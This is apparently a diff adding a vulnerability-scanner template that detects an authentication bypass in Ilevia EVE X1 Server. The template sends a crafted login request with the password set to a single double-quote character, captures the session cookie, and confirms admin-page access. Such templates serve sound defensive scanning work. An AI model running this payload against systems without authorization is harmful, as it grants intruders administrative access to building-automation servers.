@@ -1,0 +1,45 @@
+id: ilevia-eve-x1-auth-bypass
+info:
+  name: Ilevia EVE X1 Server login.php Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: auth-bypass
+http:
+  - raw:
+      - |
+        POST /login/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userid=admin&passwd=%22&login=Login
+    extractors:
+      - type: regex
+        name: phpsessid
+        part: header
+        regex:
+          - 'PHPSESSID=(.*?);'
+        internal: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/main/index.php"
+  - raw:
+      - |
+        GET /main/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID={{phpsessid}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "EVE X1 Server Main"
+          - "Home"
